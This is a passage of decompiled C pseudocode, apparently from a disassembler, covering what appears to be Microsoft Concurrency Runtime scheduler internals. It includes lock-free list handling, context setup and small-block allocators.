        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( (struct _SINGLE_LIST_ENTRY *)_InterlockedCompareExchange(
                                      (volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6),
                                      0,
                                      (signed __int32)a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = a2 + 47;
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_450C9C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_451340(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_4570AA,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0045773F) --------------------------------------------------------
char __thiscall sub_45773F(int **this)
{
  int v1; // edi
  _DWORD *v2; // ebx
  int v3; // eax
  int v4; // edi
  _DWORD *v5; // esi
  void (__thiscall *v6)(int, int); // ebx
  int v7; // eax
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  int v11; // ebx
  int v13[3]; // [esp-10h] [ebp-24h] BYREF
  int v14; // [esp-4h] [ebp-18h]
  int v15; // [esp+Ch] [ebp-8h]
  int v16; // [esp+10h] [ebp-4h]

  v1 = (int)this;
  v16 = (int)this;
  sub_451E4A(*this[20], (int)(this + 53));
  sub_45741A((_DWORD *)(**(_DWORD **)(v1 + 80) + 48), *(_DWORD *)(v1 + 144));
  _InterlockedDecrement((volatile signed __int32 *)(*(_DWORD *)(v1 + 80) + 36));
  if ( !*(_BYTE *)(v1 + 172) )
    _InterlockedDecrement((volatile signed __int32 *)(**(_DWORD **)(v1 + 80) + 20));
  sub_4578B0(**(volatile signed __int32 ***)(v1 + 80), (_DWORD *)v1);
  if ( !*(_BYTE *)(v1 + 96) )
    sub_45741A((_DWORD *)(**(_DWORD **)(v1 + 80) + 72), *(_DWORD *)(v1 + 144));
  v2 = (_DWORD *)(v1 + 16);
  *(_DWORD *)(v1 + 124) = 0;
  if ( *(_DWORD *)(v1 + 20) - *(_DWORD *)(v1 + 16) > 0 )
  {
    v3 = sub_4575FD((_DWORD *)(v1 + 16));
    v15 = v3;
    if ( v3 )
    {
      v4 = v3;
      do
      {
        v5 = (_DWORD *)sub_44CC5D((_DWORD *)(v4 + 4));
        sub_452901(v13, v5 + 3);
        sub_45A27B(v5, v4, v13[0], v13[1], v13[2], v14);
        if ( v2[1] - *v2 <= 0 )
          break;
        v4 = sub_4575FD(v2);
      }
      while ( v4 );
      v1 = v16;
    }
  }
  v15 = *(_DWORD *)(v1 + 88);
  v6 = *(void (__thiscall **)(int, int))(*(_DWORD *)v15 + 8);
  v7 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v1 + 80) + 52))(**(_DWORD **)(v1 + 80));
  v6(v15, v7);
  v8 = v16;
  *(_DWORD *)(v16 + 88) = 0;
  v9 = *(_DWORD *)(v8 + 136);
  v10 = (*(int (__thiscall **)(_DWORD))(***(_DWORD ***)(v8 + 80) + 4))(**(_DWORD **)(v8 + 80));
  v14 = v9;
  v11 = v16;
  sub_457A91(2, 4u, v10, v14);
  if ( *(_DWORD *)(v11 + 92) )
  {
    sub_451FE3(*(char **)(v11 + 92));
    *(_DWORD *)(v11 + 92) = 0;
  }
  return sub_45764B(
           (PSLIST_HEADER)(*(_DWORD *)(v11 + 80) + 56),
           (struct _SINGLE_LIST_ENTRY *)v11,
           *(_DWORD *)(v11 + 100),
           1);
}

//----- (0045789C) --------------------------------------------------------
char __thiscall sub_45789C(int this)
{
  return sub_45144B(**(_DWORD ***)(this + 80), (_DWORD *)(this + 192));
}

//----- (004578B0) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_4578B0(volatile signed __int32 *this, _DWORD *a2)
{
  unsigned int v3; // edx
  unsigned int v4; // ecx
  volatile signed __int32 *result; // eax

  v3 = a2[26] - a2[28];
  a2[28] = a2[26];
  _InterlockedExchangeAdd(this + 111, v3);
  v4 = a2[27] - a2[29];
  a2[29] = a2[27];
  result = this + 112;
  _InterlockedExchangeAdd(this + 112, v4);
  return result;
}

//----- (004578EA) --------------------------------------------------------
int __thiscall sub_4578EA(_DWORD *this, unsigned int a2)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  char v5[8]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-8h]
  void (*v7)(); // [esp+18h] [ebp-4h]

  v2 = this[1];
  v3 = 1 << (a2 & 0x1F);
  result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
  if ( (result & v3) != 0 )
  {
    v6 = 0;
    v7 = sub_44AE5E;
    while ( 1 )
    {
      result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
      if ( (result & v3) == 0 )
        break;
      sub_449592((int)v5);
    }
  }
  return result;
}
// 4578EA: using guessed type char var_10[8];

//----- (00457932) --------------------------------------------------------
int __thiscall sub_457932(_DWORD *this, unsigned int a2)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  char v5[8]; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-8h]
  void (*v7)(); // [esp+18h] [ebp-4h]

  v2 = this[1];
  v3 = 1 << (a2 & 0x1F);
  result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
  if ( (result & v3) == 0 )
  {
    v6 = 0;
    v7 = sub_44AE5E;
    while ( 1 )
    {
      result = *(_DWORD *)(v2 + 4 * (a2 >> 5));
      if ( (result & v3) != 0 )
        break;
      sub_449592((int)v5);
    }
  }
  return result;
}
// 457932: using guessed type char var_10[8];

//----- (0045797A) --------------------------------------------------------
char __thiscall sub_45797A(void *this, _DWORD *a2, int a3)
{
  int v4; // esi
  char v6[8]; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-8h]
  void (*v8)(); // [esp+18h] [ebp-4h]

  if ( *((_DWORD *)this + 31) )
  {
    v7 = 0;
    v8 = sub_44AE5E;
    do
      sub_449592((int)v6);
    while ( *((_DWORD *)this + 31) );
  }
  v4 = a3;
  if ( a3 )
  {
    if ( !*(_DWORD *)(a3 + 28) )
      sub_458FAE(a3, (int)a2, 0, 0);
    goto LABEL_7;
  }
  v4 = sub_45A713(a2, 0, 0);
  if ( v4 )
  {
LABEL_7:
    (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, v4);
    (*(void (__thiscall **)(_DWORD, _DWORD))(**((_DWORD **)this + 22) + 20))(
      *((_DWORD *)this + 22),
      *((_DWORD *)this + 31));
    return 1;
  }
  sub_45749E((int)this, 4, 1);
  sub_4500AA(**((_DWORD **)this + 20));
  return 0;
}
// 45797A: using guessed type char var_10[8];

//----- (00457A16) --------------------------------------------------------
int __cdecl sub_457A16(char a1, char a2, int a3, int a4)
{
  int result; // eax
  _DWORD v5[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_500098 )
  {
    memset((char *)v5 + 2, 0, 0x3Eu);
    v5[11] = 0x20000;
    LOWORD(v5[0]) = 64;
    LOBYTE(v5[1]) = a1;
    BYTE1(v5[1]) = a2;
    v5[6] = dword_493FBC[0];
    v5[7] = dword_493FBC[1];
    v5[8] = dword_493FBC[2];
    v5[9] = dword_493FBC[3];
    v5[13] = a3;
    v5[12] = a4;
    return sub_456D33(dword_500098, dword_500090, dword_500094, (int)v5);
  }
  return result;
}
// 493FBC: using guessed type _DWORD dword_493FBC[4];
// 500090: using guessed type int dword_500090;
// 500094: using guessed type int dword_500094;

//----- (00457A91) --------------------------------------------------------
int __stdcall sub_457A91(char a1, unsigned __int8 a2, int a3, int a4)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_50008C )
  {
    result = dword_500088;
    if ( (dword_500088 & 4) != 0 )
      return sub_457A16(a1, a2, a3, a4);
  }
  return result;
}
// 500088: using guessed type int dword_500088;
// 50008C: using guessed type char byte_50008C;

//----- (00457ABE) --------------------------------------------------------
char __thiscall sub_457ABE(int this, char a2, char a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // esi
  char result; // al
  _DWORD *v7; // [esp+8h] [ebp-4h]

  v4 = **(_DWORD ***)(this + 80);
  v7 = v4;
  if ( *(_BYTE *)(this + 96) )
  {
    if ( !a2 )
    {
      v5 = *(_DWORD *)(this + 144);
      *(_BYTE *)(this + 98) = 1;
      sub_45745A(v4 + 18, v5);
      sub_457144(v7, v5);
    }
  }
  else if ( a2 )
  {
    sub_45741A(v4 + 18, *(_DWORD *)(this + 144));
  }
  result = a3;
  *(_BYTE *)(this + 96) = a2;
  *(_BYTE *)(this + 97) = a3;
  return result;
}

//----- (00457B1C) --------------------------------------------------------
int __thiscall sub_457B1C(_DWORD *this)
{
  unsigned int v1; // edx
  unsigned int i; // esi
  int result; // eax

  v1 = (unsigned int)(*this + 31) >> 5;
  for ( i = 0; i < v1; ++i )
  {
    result = this[1];
    *(_DWORD *)(result + 4 * i) = 0;
  }
  return result;
}

//----- (00457B39) --------------------------------------------------------
char *__thiscall sub_457B39(char *this, int a2, int a3, int *a4)
{
  _DWORD *v5; // ecx
  _DWORD *v6; // ecx

  v5 = this + 8;
  *((_DWORD *)this + 1) = a4;
  *v5 = 0;
  v5[1] = 0;
  sub_44FFD9((int)v5, a2);
  sub_44EE0C((unsigned int *)this + 4, 0x1001u);
  *((_DWORD *)this + 7) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 0;
  *((_DWORD *)this + 11) = a3;
  sub_44EE4A((PSLIST_HEADER)this + 7, *a4, 256, 0x7FFFFFFF);
  v6 = (_DWORD *)*((_DWORD *)this + 1);
  *(_DWORD *)this = *v6;
  *((_DWORD *)this + 12) = v6[46];
  return this;
}

//----- (00457BB6) --------------------------------------------------------
void __thiscall sub_457BB6(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // esi
  struct _SINGLE_LIST_ENTRY *v3; // ecx
  PSLIST_ENTRY v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ecx
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v7; // eax
  struct _SINGLE_LIST_ENTRY *v8; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v10; // esi

  v2 = InterlockedFlushSList(ListHead);
  while ( v2 )
  {
    v3 = v2 - 47;
    v2 = v2->Next;
    sub_456E54(v3);
  }
  v4 = InterlockedFlushSList(ListHead + 1);
  while ( v4 )
  {
    v5 = v4 - 47;
    v4 = v4->Next;
    sub_456E54(v5);
  }
  Next = ListHead[2].Next.Next;
  while ( Next )
  {
    v7 = Next - 47;
    Next = Next->Next;
    sub_456E54(v7);
  }
  v8 = ListHead[6].Next.Next;
  if ( v8 )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_456E54(v8->Next[i].Next);
      v10 = v8[1].Next;
      j_j__free(v8->Next);
      sub_44775B(v8);
      v8 = v10;
    }
    while ( v10 );
  }
  j_j__free(*(void **)&ListHead[6].Depth);
}

//----- (00457C59) --------------------------------------------------------
void __thiscall sub_457C59(int this)
{
  sub_457BB6((PSLIST_HEADER)(this + 56));
  sub_4528B2((int *)(this + 16));
  j_j__free(*(void **)(this + 24));
  j_j__free(*(void **)(this + 12));
}

//----- (00457C82) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_457C82(_DWORD *this, signed __int32 a2)
{
  _DWORD *v2; // esi
  volatile signed __int32 *v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  signed __int32 v6; // edx
  signed __int32 v7; // eax
  char v8; // al
  volatile __int32 *v9; // edi
  void *v10; // eax
  int *v11; // ecx
  int v12; // eax
  int v13; // edx
  size_t v15; // [esp-8h] [ebp-38h]
  char v16[8]; // [esp+Ch] [ebp-24h] BYREF
  int v17; // [esp+14h] [ebp-1Ch]
  int (*v18)(); // [esp+18h] [ebp-18h]
  int v19; // [esp+1Ch] [ebp-14h]
  volatile signed __int32 *v20; // [esp+20h] [ebp-10h]
  _DWORD *v21; // [esp+24h] [ebp-Ch]
  volatile signed __int32 *v22; // [esp+28h] [ebp-8h]
  char v23; // [esp+2Fh] [ebp-1h]

  v2 = this;
  v23 = 0;
  v21 = this;
  v3 = 0;
  v4 = this[12];
  do
  {
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v5 = *(volatile signed __int32 **)v4;
    v6 = 0;
    v22 = *(volatile signed __int32 **)v4;
    if ( (int)v2[10] <= 0 )
    {
LABEL_8:
      v8 = v23;
      if ( v23 )
        goto LABEL_25;
LABEL_9:
      _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -2, -1);
      v22 = (volatile signed __int32 *)((char *)v3 + v2[10]);
      v9 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v9, 1, 0) )
      {
        v10 = (void *)unknown_libname_86((unsigned __int64)(unsigned int)v2[10] >> 30 != 0 ? -1 : 4 * v2[10]);
        v15 = 4 * v2[10];
        v19 = (int)v10;
        memset(v10, 0, v15);
        v11 = (int *)operator new(0xCu);
        v20 = v11;
        if ( v11 )
        {
          v12 = v19;
          v11[1] = 0;
          v11[2] = -1;
          *v11 = v12;
        }
        else
        {
          v11 = 0;
        }
        v13 = v2[15];
        if ( v13 < v2[14] )
        {
          *(_DWORD *)(v2[13] + 4 * v13) = v11;
          ++v2[15];
        }
        _InterlockedExchange(v9, (__int32)v11);
      }
      if ( *v9 == 1 )
      {
        v17 = 0;
        v18 = sub_44AE9C;
        do
          sub_449592((int)v16);
        while ( *v9 == 1 );
      }
      v3 = v22;
      goto LABEL_24;
    }
    while ( *v5 )
    {
LABEL_7:
      ++v6;
      v22 = ++v5;
      if ( v6 >= v2[10] )
        goto LABEL_8;
    }
    v20 = (volatile signed __int32 *)((char *)v3 + v6);
    *(_DWORD *)(a2 + 100) = (char *)v3 + v6;
    v19 = v2[16];
    v7 = _InterlockedCompareExchange(v22, a2, 0);
    v2 = v21;
    if ( v7 )
    {
      v5 = v22;
      goto LABEL_7;
    }
    v3 = v20;
    v23 = 1;
    if ( (int)v20 >= v19 )
      _InterlockedIncrement(v21 + 16);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v6);
LABEL_24:
    v8 = v23;
LABEL_25:
    v4 = *(_DWORD *)(v4 + 4);
  }
  while ( !v8 );
  return v3;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 457C82: using guessed type char var_24[8];

//----- (00457DDE) --------------------------------------------------------
signed __int32 __thiscall sub_457DDE(_DWORD *this, int a2, char a3)
{
  PSLIST_ENTRY v4; // eax
  signed __int32 v5; // edi
  int v6; // ecx
  _DWORD *v8; // [esp+10h] [ebp-4h]

  v8 = sub_4501C0();
  v4 = InterlockedPopEntrySList((PSLIST_HEADER)this + 7);
  if ( !v4 || (v5 = (signed __int32)&v4[-47], v4 == (PSLIST_ENTRY)188) )
    v5 = (*(int (__thiscall **)(_DWORD, _DWORD *, int))(*(_DWORD *)*this + 92))(*this, this, a2);
  else
    (*(void (__thiscall **)(signed __int32, _DWORD *, int))(*(_DWORD *)v5 + 24))(v5, this, a2);
  if ( a3 )
  {
    *(_BYTE *)(v5 + 172) = 1;
    *(_DWORD *)(v5 + 176) = v8 - 1;
    v8[40] = v5;
  }
  _InterlockedIncrement(this + 9);
  sub_45745A((_DWORD *)(*this + 48), *(_DWORD *)(v5 + 144));
  if ( *(_DWORD *)(*this + 436) == *(_DWORD *)(*this + 440) && *(int *)(*this + 20) > 0 )
  {
    sub_457C82(this + 14, v5);
    if ( sub_4527A1((volatile signed __int32 *)*this, 1) )
    {
      if ( v8 )
        v6 = sub_44CC5D(v8);
      else
        v6 = *(_DWORD *)(this[1] + 8);
      (*(void (__thiscall **)(signed __int32, int, _DWORD))(*(_DWORD *)v5 + 28))(v5, v6, 0);
    }
  }
  else
  {
    sub_457C82(this + 14, v5);
    sub_45749E(v5, 1, 0);
  }
  return v5;
}

//----- (00457EE6) --------------------------------------------------------
char __thiscall sub_457EE6(_DWORD *this)
{
  LPVOID v2; // eax
  int v3; // esi
  _DWORD *v4; // edi
  char v5; // bl

  v2 = sub_4501C0();
  v3 = (int)v2 + 156;
  if ( !v2 )
    v3 = 160;
  v4 = (_DWORD *)*this;
  if ( !sub_451304((_DWORD *)(*v4 + 60), (int)(v4 + 1)) )
    return 0;
  v5 = 1;
  if ( ((1 << (*(_DWORD *)(*(_DWORD *)v3 + 144) & 0x1F)) & *(_DWORD *)(v4[2]
                                                                     + 4 * (*(_DWORD *)(*(_DWORD *)v3 + 144) >> 5))) != 0 )
    return 0;
  return v5;
}

//----- (00457F3A) --------------------------------------------------------
int __thiscall sub_457F3A(_DWORD *this, int a2)
{
  int v2; // edi
  int v3; // esi
  _DWORD *v4; // eax
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  v2 = this[30];
  v3 = 0;
  if ( v2 <= 0 )
    return 0;
  v4 = this + 14;
  for ( i = this + 14; ; v4 = i )
  {
    result = sub_44F5A7(v4, v3);
    if ( result )
    {
      if ( *(_DWORD *)(result + 88) == a2 )
        break;
    }
    if ( ++v3 >= v2 )
      return 0;
  }
  return result;
}

//----- (00457F77) --------------------------------------------------------
int __thiscall sub_457F77(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  int v4; // esi

  if ( (*a2 & 0xFFFFFFF) != 3 )
    return 0;
  if ( a2[1] == *(_DWORD *)(*this + 372) )
    return a2[3];
  v4 = 0;
  if ( (int)this[30] <= 0 )
    return 0;
  while ( 1 )
  {
    result = sub_44F5A7(this + 14, v4);
    if ( result )
    {
      if ( *(_DWORD *)(result + 140) == a2[2] )
        break;
    }
    if ( ++v4 >= this[30] )
      return 0;
  }
  return result;
}

//----- (00457FD1) --------------------------------------------------------
char __thiscall sub_457FD1(_DWORD *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7)
{
  char v7; // bl
  __int32 v9; // eax
  int v10; // edi
  __int32 v11; // eax

  v7 = 1;
  if ( (a3 & 0xFFFFFFF) != 3 || (v9 = sub_457F77(this, &a3)) == 0 || !sub_4570B6(v9, a2, a7, 1) )
  {
    v10 = 0;
    if ( (int)this[30] <= 0 )
    {
      return 0;
    }
    else
    {
      while ( 1 )
      {
        v11 = sub_44F5A7(this + 14, v10);
        if ( v11 )
        {
          if ( sub_4570B6(v11, a2, a7, 1) )
            break;
        }
        if ( ++v10 >= this[30] )
          return 0;
      }
    }
  }
  return v7;
}

//----- (00458041) --------------------------------------------------------
int *__thiscall sub_458041(int *this, int *a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)*this + 4))(*this);
  sub_45C998(a2, 2, this[12], v3, (int)this);
  return a2;
}

//----- (00458075) --------------------------------------------------------
__int32 __thiscall sub_458075(int *this, char a2)
{
  __int32 v3; // edi
  volatile __int32 *v5; // [esp+10h] [ebp-10h]

  v5 = (volatile __int32 *)this[5];
  sub_44AE12(v5);
  v3 = sub_4580B8(this, a2);
  sub_44AE53(v5);
  return v3;
}

//----- (004580B8) --------------------------------------------------------
__int32 __thiscall sub_4580B8(int *this, char a2)
{
  int v3; // edi
  int v4; // ecx
  __int32 v5; // ebx

  while ( 1 )
  {
    if ( *this >= this[1] )
      return 0;
    v3 = *this;
    v4 = *this & this[2];
    if ( (*(_BYTE *)(this[3] + 4 * v4) & 1) != 0 && !a2 && sub_457EE6((_DWORD *)(this[4] + 8 * v4)) )
      return 0;
    v5 = _InterlockedExchange((volatile __int32 *)(this[3] + 4 * (this[2] & v3)), 0);
    if ( (v5 & 1) == 0 )
      break;
    v5 &= ~1u;
    if ( sub_453082((int *)(this[4] + 8 * (this[2] & v3)), 0) )
      break;
    *this = v3 + 1;
  }
  if ( v5 )
    *this = v3 + 1;
  return v5;
}

//----- (00458136) --------------------------------------------------------
void __thiscall sub_458136(_DWORD *this)
{
  *this = 0;
  this[1] = sub_44AB76(0);
}

//----- (0045814B) --------------------------------------------------------
void __thiscall sub_45814B(_DWORD *this)
{
  _DWORD *v2; // eax

  if ( *this )
  {
    do
    {
      v2 = (_DWORD *)sub_44AB76(this[1]);
      this[1] = *v2;
      j_j__free(v2);
    }
    while ( (*this)-- != 1 );
  }
}

//----- (0045819D) --------------------------------------------------------
int *__thiscall sub_45819D(_DWORD *this)
{
  int *result; // eax
  int v3; // ecx

  result = (int *)sub_44AB76(this[1]);
  if ( result )
  {
    v3 = *result;
    --*this;
    this[1] = v3;
  }
  return result;
}

//----- (004581B6) --------------------------------------------------------
int *__thiscall sub_4581B6(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // edi
  int *v6; // esi

  v3 = a2 + 4;
  v4 = sub_458267(a2 + 4);
  v5 = v4;
  if ( v4 == -1 )
    goto LABEL_4;
  v6 = sub_45819D(&this[2 * v4 + 1]);
  if ( !v6 )
  {
    v3 = dword_4940E8[v5];
LABEL_4:
    v6 = (int *)unknown_libname_86(v3);
  }
  *v6 = sub_44AB76(v5);
  return v6 + 1;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4940E8: using guessed type int dword_4940E8[98];

//----- (00458206) --------------------------------------------------------
char __thiscall sub_458206(int *this, _DWORD *a2)
{
  int v3; // eax

  if ( *this >= 32 )
    return 0;
  *a2 = this[1];
  v3 = sub_44AB76((int)a2);
  ++*this;
  this[1] = v3;
  return 1;
}

//----- (00458230) --------------------------------------------------------
void __thiscall sub_458230(int *this, int a2)
{
  _DWORD *v2; // esi
  int v4; // eax

  v2 = (_DWORD *)(a2 - 4);
  v4 = sub_44AB76(*(_DWORD *)(a2 - 4));
  if ( v4 == -1 || !sub_458206(&this[2 * v4 + 1], v2) )
    j_j__free(v2);
}

//----- (00458267) --------------------------------------------------------
int __cdecl sub_458267(int a1)
{
  unsigned int v1; // edx
  int v3; // edx
  int v4; // ecx

  v1 = (a1 + 7) & 0xFFFFFFF8;
  if ( v1 > 0x1000 )
    return -1;
  v3 = v1 >> 3;
  if ( (unsigned int)v3 > 0x20 )
  {
    v4 = 5;
    if ( v3 >> 5 )
    {
      do
        ++v4;
      while ( v3 >> v4 > 0 );
    }
    v3 = 16 * (v4 - 5) + ((~((1 << (v4 - 5)) - 1) & ((1 << (v4 - 5)) - 1 + v3)) >> (v4 - 5));
  }
  return v3 - 1;
}

//----- (004582B8) --------------------------------------------------------
int *__cdecl sub_4582B8(int a1)
{
  int v1; // esi
  int v2; // eax
  int v3; // edi
  int *v4; // esi

  v1 = a1 + 4;
  v2 = sub_458267(a1 + 4);
  v3 = v2;
  if ( v2 != -1 )
    v1 = dword_4940E8[v2];
  v4 = (int *)unknown_libname_86(v1);
  *v4 = sub_44AB76(v3);
  return v4 + 1;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 4940E8: using guessed type int dword_4940E8[98];

//----- (004582F1) --------------------------------------------------------
_DWORD *__thiscall sub_4582F1(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = &Concurrency::IExecutionContext::`vftable';
  sub_452A73(this + 1, a2, 0);
  *((_BYTE *)this + 179) &= 0xFCu;
  result = this;
  *this = &Concurrency::details::InternalContextBase::`vftable';
  this[1] = &Concurrency::details::InternalContextBase::`vftable';
  this[39] = 0;
  this[40] = 0;
  this[41] = 0;
  this[42] = 0;
  this[43] = 0;
  *((_BYTE *)this + 176) = 0;
  *((_BYTE *)this + 178) = 0;
  this[57] = 0;
  this[7] = 0;
  *((_BYTE *)this + 236) = 1;
  return result;
}
// 494274: using guessed type void *Concurrency::IExecutionContext::`vftable';
// 49428C: using guessed type void *Concurrency::details::InternalContextBase::`vftable';
// 4942B4: using guessed type void *Concurrency::details::InternalContextBase::`vftable';

//----- (00458368) --------------------------------------------------------
char *__thiscall sub_458368(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::context_self_unblock::`vftable';
  return this;
}
// 493BD4: using guessed type void *Concurrency::context_self_unblock::`vftable';

//----- (00458383) --------------------------------------------------------
char *__thiscall sub_458383(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::context_unblock_unbalanced::`vftable';
  return this;
}
// 493BC8: using guessed type void *Concurrency::context_unblock_unbalanced::`vftable';

//----- (0045839E) --------------------------------------------------------
char *__thiscall sub_45839E(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_oversubscribe_operation::`vftable';
  return this;
}
// 493C1C: using guessed type void *Concurrency::invalid_oversubscribe_operation::`vftable';

//----- (004583B9) --------------------------------------------------------
char *__thiscall sub_4583B9(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &Concurrency::nested_scheduler_missing_detach::`vftable';
  return this;
}
// 493C10: using guessed type void *Concurrency::nested_scheduler_missing_detach::`vftable';

//----- (004583D4) --------------------------------------------------------
void __thiscall sub_4583D4(_DWORD *this)
{
  void *v1; // esi

  v1 = this + 1;
  *this = &Concurrency::details::InternalContextBase::`vftable';
  this[1] = &Concurrency::details::InternalContextBase::`vftable';
  sub_4587FB(this);
  sub_452BBA(v1);
}
// 49428C: using guessed type void *Concurrency::details::InternalContextBase::`vftable';
// 4942B4: using guessed type void *Concurrency::details::InternalContextBase::`vftable';

//----- (00458420) --------------------------------------------------------
int sub_458420()
{
  return UserMathErrorFunction();
}

//----- (00458456) --------------------------------------------------------
char *__thiscall sub_458456(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_4583D4(this - 1);
  if ( (a2 & 1) != 0 )
    sub_44775B(v2);
  return v2;
}

//----- (00458483) --------------------------------------------------------
int __thiscall sub_458483(_DWORD *this, int a2, int a3, int a4, int a5)
{
  LPVOID v6; // eax
  int v7; // edx
  int v8; // edi
  int v9; // edi
  int (__thiscall *v10)(int, _DWORD *, int, int, int, int); // esi
  int result; // eax
  int v12; // edx
  int v13; // esi
  unsigned int *v14; // esi
  _DWORD *v15; // esi
  int v16; // [esp-14h] [ebp-38h] BYREF
  int v17; // [esp-10h] [ebp-34h] BYREF
  int v18; // [esp-Ch] [ebp-30h]
  int v19; // [esp-8h] [ebp-2Ch]
  int v20; // [esp-4h] [ebp-28h]
  int v21[5]; // [esp+Ch] [ebp-18h] BYREF
  int v22; // [esp+20h] [ebp-4h]

  v6 = sub_4501C0();
  v7 = this[8];
  v8 = (int)v6;
  v22 = (int)v6;
  if ( *(int *)(v7 + 440) > 0 )
  {
    v9 = this[8];
    v10 = *(int (__thiscall **)(int, _DWORD *, int, int, int, int))(*(_DWORD *)v9 + 60);
    sub_452901(&v17, &a2);
    result = v10(v9, this, v17, v18, v19, v20);
    if ( (_BYTE)result )
      return result;
    v8 = v22;
  }
  if ( !v8 || *(_BYTE *)(v8 + 76) || this[8] != sub_43E90F((_DWORD *)v8) )
    goto LABEL_18;
  UserMathErrorFunction();
  v12 = this[7];
  if ( (*(_BYTE *)(*(_DWORD *)(v12 + 256) + 48) & 2) != 0
    || ((1 << (*(_BYTE *)(*(_DWORD *)(v8 + 156) + 144) & 0x1F)) & *(_DWORD *)(*(_DWORD *)(v12 + 32)
                                                                            + 4
                                                                            * (*(_DWORD *)(*(_DWORD *)(v8 + 156) + 144) >> 5))) == 0
    || *(_DWORD *)(*(_DWORD *)(v8 + 156) + 20) - *(_DWORD *)(*(_DWORD *)(v8 + 156) + 16) >= *(unsigned __int16 *)(this[8] + 16) )
  {
    UserMathErrorFunction();
LABEL_18:
    v15 = (_DWORD *)this[7];
    sub_452901(&v17, &a2);
    return sub_45A27B(v15, (int)this, v17, v18, v19, v20);
  }
  v22 = this[7];
  v13 = v22;
  if ( sub_45341D((_DWORD *)v8) != *(_DWORD *)(v13 + 256) )
    this[57] = 1;
  sub_459018((int *)(*(_DWORD *)(v8 + 156) + 16), (int)this);
  if ( *(int *)(this[8] + 436) > 0 )
  {
    v14 = (unsigned int *)this[8];
    sub_452901(v21, &a2);
    v20 = 11;
    sub_452901(&v16, v21);
    sub_4521A6(v14, v22, v16, v17, v18, v19, v20);
    v13 = v22;
  }
  if ( sub_45341D((_DWORD *)v8) != *(_DWORD *)(v13 + 256) )
    this[57] = 0;
  return UserMathErrorFunction();
}
// 458483: using guessed type int var_18[5];

//----- (004585FD) --------------------------------------------------------
int *__thiscall sub_4585FD(_DWORD **this, int a2)
{
  PSLIST_ENTRY v3; // eax
  int *v4; // esi

  UserMathErrorFunction();
  v3 = sub_457269(this[39]);
  v4 = sub_4581B6(v3, a2);
  UserMathErrorFunction();
  return v4;
}

//----- (00458651) --------------------------------------------------------
int __thiscall sub_458651(int this)
{
  int v2; // ebx
  int v3; // eax
  int v4; // esi
  char v5; // al
  signed __int32 v6; // ecx
  struct _SINGLE_LIST_ENTRY *v7; // edi
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v9; // esi
  int v10; // eax
  int v12[7]; // [esp-10h] [ebp-24h] BYREF
  int v13; // [esp+Ch] [ebp-8h]
  bool v14; // [esp+12h] [ebp-2h] BYREF
  bool v15; // [esp+13h] [ebp-1h] BYREF

  v13 = this;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 8);
